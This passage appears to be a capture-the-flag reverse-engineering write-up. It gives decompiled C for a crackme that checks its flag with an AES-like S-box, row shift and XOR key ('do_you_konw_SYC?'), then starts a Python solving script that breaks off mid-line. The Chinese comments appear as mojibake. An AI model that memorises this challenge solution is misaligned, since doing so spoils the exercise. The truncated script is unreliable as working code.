<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">ShiftRow</span><span class="params">(__int64 flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i += <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i / <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = *(<span class="number">4</span>i64 * i + flag);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">2</span>; ++k )</span><br><span class="line">        *(<span class="number">4</span>i64 * (i + k) + flag) = *(flag + <span class="number">4</span> * (i + k + <span class="number">1</span>i64));</span><br><span class="line">      *(<span class="number">4</span>i64 * (i + k) + flag) = v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">tansform</span><span class="params">(__int64 flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">20</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+54h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    v5[i] = *(<span class="number">4</span>i64 * i + flag);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      *(flag + <span class="number">4</span>i64 * v9) = v5[<span class="number">4</span> * k + j];</span><br><span class="line">      v2 = S[*(<span class="number">4</span>i64 * v9 + flag)];</span><br><span class="line">      v3 = v9++;</span><br><span class="line">      v4 = (flag + <span class="number">4</span>i64 * v3);</span><br><span class="line">      result = v2;</span><br><span class="line">      *v4 = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ•´ä½“ä»£ç å¦‚ä¸‹ å…¶ä¸­è¿˜æœ‰ä¸€ä¸ªå¼‚æˆ–åŠ å¯† ç”¨æ¥å®ç°AESç®—æ³•</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Str[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> flag1[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE flag2[<span class="number">96</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+F0h] [rbp+70h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+F8h] [rbp+78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+100h] [rbp+80h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">20</span>]; <span class="comment">// [rsp+110h] [rbp+90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">15</span>]; <span class="comment">// [rsp+124h] [rbp+A4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+133h] [rbp+B3h] BYREF</span></span><br><span class="line">  __int64 v13[<span class="number">3</span>]; <span class="comment">// [rsp+140h] [rbp+C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+158h] [rbp+D8h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+15Ch] [rbp+DCh]</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">16</span>]; <span class="comment">// [rsp+160h] [rbp+E0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v17[<span class="number">40</span>]; <span class="comment">// [rsp+170h] [rbp+F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">176</span>]; <span class="comment">// [rsp+210h] [rbp+190h] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+2C0h] [rbp+240h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+2C2h] [rbp+242h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+2C4h] [rbp+244h]</span></span><br><span class="line">  <span class="type">int</span> _32; <span class="comment">// [rsp+2C8h] [rbp+248h]</span></span><br><span class="line">  <span class="type">int</span> i2; <span class="comment">// [rsp+2CCh] [rbp+24Ch]</span></span><br><span class="line">  <span class="type">int</span> cnt; <span class="comment">// [rsp+2D0h] [rbp+250h]</span></span><br><span class="line">  <span class="type">int</span> i1; <span class="comment">// [rsp+2D4h] [rbp+254h]</span></span><br><span class="line">  <span class="type">int</span> nn; <span class="comment">// [rsp+2D8h] [rbp+258h]</span></span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+2DCh] [rbp+25Ch]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+2E0h] [rbp+260h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+2E4h] [rbp+264h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+2E8h] [rbp+268h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+2ECh] [rbp+26Ch]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+2F0h] [rbp+270h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+2F4h] [rbp+274h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2F8h] [rbp+278h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2FCh] [rbp+27Ch]</span></span><br><span class="line"></span><br><span class="line">  (_main)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="keyword">sizeof</span>(v18));</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  v17[<span class="number">0</span>] = <span class="number">0xE0</span>;</span><br><span class="line">  v17[<span class="number">1</span>] = <span class="number">0xFFFFFF05</span>;</span><br><span class="line">  v17[<span class="number">2</span>] = <span class="number">0xFFFFFF6E</span>;</span><br><span class="line">  v17[<span class="number">3</span>] = <span class="number">0xFFFFFFC2</span>;</span><br><span class="line">  v17[<span class="number">4</span>] = <span class="number">0xFFFFFF6E</span>;</span><br><span class="line">  v17[<span class="number">5</span>] = <span class="number">0xFFFFFF99</span>;</span><br><span class="line">  v17[<span class="number">6</span>] = <span class="number">0xFFFFFF68</span>;</span><br><span class="line">  v17[<span class="number">7</span>] = <span class="number">0x45</span>;</span><br><span class="line">  v17[<span class="number">8</span>] = <span class="number">0xFFFFFF7D</span>;</span><br><span class="line">  v17[<span class="number">9</span>] = <span class="number">0xFFFFFF1F</span>;</span><br><span class="line">  v17[<span class="number">10</span>] = <span class="number">0xFFFFFF3F</span>;</span><br><span class="line">  v17[<span class="number">11</span>] = <span class="number">0xFFFFFFF9</span>;</span><br><span class="line">  v17[<span class="number">12</span>] = <span class="number">0xFFFFFF97</span>;</span><br><span class="line">  v17[<span class="number">13</span>] = <span class="number">0xFFFFFF76</span>;</span><br><span class="line">  v17[<span class="number">14</span>] = <span class="number">0x3B</span>;</span><br><span class="line">  v17[<span class="number">15</span>] = <span class="number">0x92</span>;</span><br><span class="line">  v17[<span class="number">16</span>] = <span class="number">0x2F</span>;</span><br><span class="line">  v17[<span class="number">17</span>] = <span class="number">0xFFFFFF44</span>;</span><br><span class="line">  v17[<span class="number">18</span>] = <span class="number">0xFFFFFF06</span>;</span><br><span class="line">  v17[<span class="number">19</span>] = <span class="number">0xFFFFFF67</span>;</span><br><span class="line">  v17[<span class="number">20</span>] = <span class="number">0xFFFFFFA8</span>;</span><br><span class="line">  v17[<span class="number">21</span>] = <span class="number">0xFFFFFFEB</span>;</span><br><span class="line">  v17[<span class="number">22</span>] = <span class="number">0xFFFFFFEC</span>;</span><br><span class="line">  v17[<span class="number">23</span>] = <span class="number">0x4A</span>;</span><br><span class="line">  v17[<span class="number">24</span>] = <span class="number">0xFFFFFF6F</span>;</span><br><span class="line">  v17[<span class="number">25</span>] = <span class="number">0xFFFFFFE8</span>;</span><br><span class="line">  v17[<span class="number">26</span>] = <span class="number">0xFFFFFF35</span>;</span><br><span class="line">  v17[<span class="number">27</span>] = <span class="number">0xFFFFFFF9</span>;</span><br><span class="line">  v17[<span class="number">28</span>] = <span class="number">0xFFFFFFAC</span>;</span><br><span class="line">  v17[<span class="number">29</span>] = <span class="number">0xFFFFFFA7</span>;</span><br><span class="line">  v17[<span class="number">30</span>] = <span class="number">0x8C</span>;</span><br><span class="line">  v17[<span class="number">31</span>] = <span class="number">0x71</span>;</span><br><span class="line">  qmemcpy(v16, <span class="string">&quot;nyi&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">-125</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span class="number">121</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">127</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">105</span>;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">117</span>;</span><br><span class="line">  v16[<span class="number">8</span>] = <span class="number">121</span>;</span><br><span class="line">  v16[<span class="number">9</span>] = <span class="number">120</span>;</span><br><span class="line">  v16[<span class="number">10</span>] = <span class="number">-127</span>;</span><br><span class="line">  v16[<span class="number">11</span>] = <span class="number">105</span>;</span><br><span class="line">  v16[<span class="number">12</span>] = <span class="number">93</span>;</span><br><span class="line">  v16[<span class="number">13</span>] = <span class="number">99</span>;</span><br><span class="line">  v16[<span class="number">14</span>] = <span class="number">77</span>;</span><br><span class="line">  v16[<span class="number">15</span>] = <span class="number">73</span>;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0x78732A6F6D6B767A</span>i64;</span><br><span class="line">  v13[<span class="number">1</span>] = <span class="number">0x7C7F79832A7E7F79</span>i64;</span><br><span class="line">  v13[<span class="number">2</span>] = <span class="number">0x142A44716B76702A</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">-125</span>;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">111</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">125</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">43</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">5</span>] = <span class="number">-125</span>;</span><br><span class="line">  v10[<span class="number">6</span>] = <span class="number">121</span>;</span><br><span class="line">  v10[<span class="number">7</span>] = <span class="number">127</span>;</span><br><span class="line">  v10[<span class="number">8</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">9</span>] = <span class="number">107</span>;</span><br><span class="line">  v10[<span class="number">10</span>] = <span class="number">124</span>;</span><br><span class="line">  v10[<span class="number">11</span>] = <span class="number">111</span>;</span><br><span class="line">  v10[<span class="number">12</span>] = <span class="number">42</span>;</span><br><span class="line">  v10[<span class="number">13</span>] = <span class="number">124</span>;</span><br><span class="line">  v10[<span class="number">14</span>] = <span class="number">115</span>;</span><br><span class="line">  v10[<span class="number">15</span>] = <span class="number">113</span>;</span><br><span class="line">  v10[<span class="number">16</span>] = <span class="number">114</span>;</span><br><span class="line">  v10[<span class="number">17</span>] = <span class="number">126</span>;</span><br><span class="line">  v10[<span class="number">18</span>] = <span class="number">43</span>;</span><br><span class="line">  v10[<span class="number">19</span>] = <span class="number">20</span>;</span><br><span class="line">  qmemcpy(v11, <span class="string">&quot;\nxy&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">-120</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">126</span>;</span><br><span class="line">  v11[<span class="number">5</span>] = <span class="number">124</span>;</span><br><span class="line">  v11[<span class="number">6</span>] = <span class="number">-125</span>;</span><br><span class="line">  v11[<span class="number">7</span>] = <span class="number">42</span>;</span><br><span class="line">  v11[<span class="number">8</span>] = <span class="number">107</span>;</span><br><span class="line">  v11[<span class="number">9</span>] = <span class="number">113</span>;</span><br><span class="line">  v11[<span class="number">10</span>] = <span class="number">107</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">115</span>;</span><br><span class="line">  v11[<span class="number">12</span>] = <span class="number">120</span>;</span><br><span class="line">  v11[<span class="number">13</span>] = <span class="number">-120</span>;</span><br><span class="line">  v11[<span class="number">14</span>] = <span class="number">20</span>;</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;\nxy&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">-120</span>;</span><br><span class="line">  v12[<span class="number">4</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; ++i )</span><br><span class="line">    *(v13 + i) -= <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">39</span>; ++j )</span><br><span class="line">    v10[j] -= <span class="number">10</span>;</span><br><span class="line">  *v7 = <span class="number">0</span>i64;</span><br><span class="line">  v8 = <span class="number">0</span>i64;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v13);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  _32 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v21 = <span class="built_in">strlen</span>(v7);</span><br><span class="line">  <span class="keyword">if</span> ( _32 != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v12[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v16[k] -= <span class="number">10</span>;</span><br><span class="line">    v7[k] = v16[k];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( Str[<span class="number">5</span>] != <span class="string">&#x27;.&#x27;</span> || Str[<span class="number">10</span>] != <span class="string">&#x27;l&#x27;</span> || Str[<span class="number">17</span>] != <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v12[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">15</span>; ++m )</span><br><span class="line">    v18[m] = v7[m];                             <span class="comment">// v18 = do_you_konw_SYC?</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">1</span>; n &lt;= <span class="number">10</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">31</span>; ++ii )</span><br><span class="line">      v18[<span class="number">16</span> * n + ii] = v18[<span class="number">16</span> * n - <span class="number">16</span> + ii] ^ S[v18[<span class="number">16</span> * n - <span class="number">16</span> + ii]];</span><br><span class="line">  &#125;</span><br><span class="line">  HIBYTE(v19) = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">  kk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt; _32; ++jj )</span><br><span class="line">    flag1[jj] = S[Str[jj]];</span><br><span class="line">  <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">0</span>; ++kk )</span><br><span class="line">  &#123;</span><br><span class="line">    ShiftRow(flag1);                            <span class="comment">// å°†ç¬¬nè¡Œçš„å‰(n - 1)ä¸ªå…ƒç´ å‘å³ç§»åŠ¨(5 - n)æ ¼</span></span><br><span class="line">    ShiftRow(flag2);</span><br><span class="line">    tansform(flag1);</span><br><span class="line">    tansform(flag2);</span><br><span class="line">    <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">15</span>; ++mm )</span><br><span class="line">    &#123;</span><br><span class="line">      flag1[mm] ^= v18[<span class="number">16</span> * kk + mm];           <span class="comment">// å°†flagä¸key1å¼‚æˆ–</span></span><br><span class="line">      flag1[mm + <span class="number">16</span>] ^= v18[<span class="number">16</span> * kk + mm];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( nn = <span class="number">0</span>; nn &lt; _32; ++nn )</span><br><span class="line">      flag1[nn] = S[flag1[nn]];                 <span class="comment">// å°†flagä¸­çš„å€¼æ›¿æ¢ä¸ºSä¸­ä»¥flagçš„å€¼ä¸ºç´¢å¼•çš„å€¼</span></span><br><span class="line">  &#125;</span><br><span class="line">  ShiftRow(flag1);</span><br><span class="line">  ShiftRow(flag2);</span><br><span class="line">  <span class="keyword">for</span> ( i1 = <span class="number">0</span>; i1 &lt;= <span class="number">15</span>; ++i1 )                <span class="comment">// å°†flagä¸key2å¼‚æˆ–</span></span><br><span class="line">  &#123;</span><br><span class="line">    flag1[i1] ^= v18[<span class="number">16</span> * kk + i1];</span><br><span class="line">    flag1[i1 + <span class="number">16</span>] ^= v18[<span class="number">16</span> * kk + i1];</span><br><span class="line">  &#125;</span><br><span class="line">  cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i2 = <span class="number">0</span>; i2 &lt;= <span class="number">31</span>; ++i2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( flag1[i2] == v17[i2] )</span><br><span class="line">      ++cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cnt &lt;= <span class="number">31</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v11[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ®æ­¤å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, </span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, </span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, </span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, </span><br><span class="line">  <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, </span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, </span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, </span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, </span><br><span class="line">  <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, </span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, </span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line">key_ = <span class="string">&quot;do_you_konw_SYC?&quot;</span></span><br><span class="line">v17 = [<span class="literal">None</span>] * <span class="number">32</span></span><br><span class="line">v17[<span class="number">0</span>] = <span class="number">0xE0</span></span><br><span class="line">v17[<span class="number">1</span>] = <span class="number">0x05</span></span><br><span class="line">v17[<span class="number">2</span>] = <span class="number">0x6E</span></span><br><span class="line">v17[<span class="number">3</span>] = <span class="number">0xC2</span></span><br><span class="line">v17[<span class="number">4</span>] = <span class="number">0x6E</span></span><br><span class="line">v17[<span class="number">5</span>] = <span class="number">0x99</span></span><br><span class="line">v17[<span class="number">6</span>] = <span class="number">0x68</span></span><br><span class="line">v17[<span class="number">7</span>] = <span class="number">0x45</span></span><br><span class="line">v17[<span class="number">8</span>] = <span class="number">0x7D</span></span><br><span class="line">v17[<span class="number">9</span>] = <span class="number">0x1F</span></span><br><span class="line">v17[<span class="number">10</span>] = <span class="number">0x3F</span></span><br><span class="line">v17[<span class="number">11</span>] = <span class="number">0xF9</span></span><br><span class="line">v17[<span class="number">12</span>] = <span class="number">0x97</span></span><br><span class="line">v17[<span class="number">13</span>] = <span class="number">0x76</span></span><br><span class="line">v17[<span class="number">14</span>] = <span class="number">0x3B</span></span><br><span class="line">v17[<span class="number">15</span>] = <span class="number">0x92</span></span><br><span class="line">v17[<span class="number">16</span>] = <span class="number">0x2F</span></span><br><span class="line">v17[<span class="number">17</span>] = <span class="number">0x44</span></span><br><span class="line">v17[<span class="number">18</span>] = <span class="number">0x06</span></span><br><span class="line">v17[<span class="number">19</span>] = <span class="number">0x67</span></span><br><span class="line">v17[<span class="number">20</span>] = 